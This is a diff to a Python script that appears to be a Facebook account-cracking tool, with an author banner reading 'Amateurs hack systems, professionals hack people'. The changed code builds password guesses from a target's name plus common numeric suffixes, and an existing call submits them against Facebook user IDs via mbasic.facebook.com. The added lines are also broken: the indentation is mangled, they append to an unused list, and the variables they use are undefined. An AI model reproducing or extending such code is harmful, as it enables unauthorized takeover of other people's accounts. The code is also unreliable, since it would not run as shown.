@@ -100,14 +100,14 @@ logo =                                          """
        88~~~88  .dPYb.  88~~~b. 
        88   88 .8P  Y8. 88   8D 
        YP   YP YP    YP Y8888P' 
------------------------------------------------
+---------------------------------------
   ➤ Author    : Azan Ali
   ➤ Github    : https://github.com/MR-AZAN
   ➤ Facebook  : AZAN ALI
   Amateurs hack systems,professionals hack people
------------------------------------------------
+---------------------------------------
   Use flight (Airplane) mode if slow result
------------------------------------------------"""                                              
+---------------------------------------"""                                              
 
 def hasil(OK,cp):
 	if not len(OK) != 0:
@@ -294,8 +294,19 @@ class __xxx__:
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                             pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                         else:
-                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
-                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
+                            pwv.append(nmf)
+					pwv.append(nmf)
+					pwv.append(frs+'123')
+					pwv.append(frs+'786')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'123456')
+					pwv.append(frs+'@123')
+					pwv.append(frs+'1122')
+					pwv.append('112233')
+					pwv.append(frs+'12')
+					pwv.append('1234512345')
+					pwv.append('223344')
                         ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                     except:
                         pass
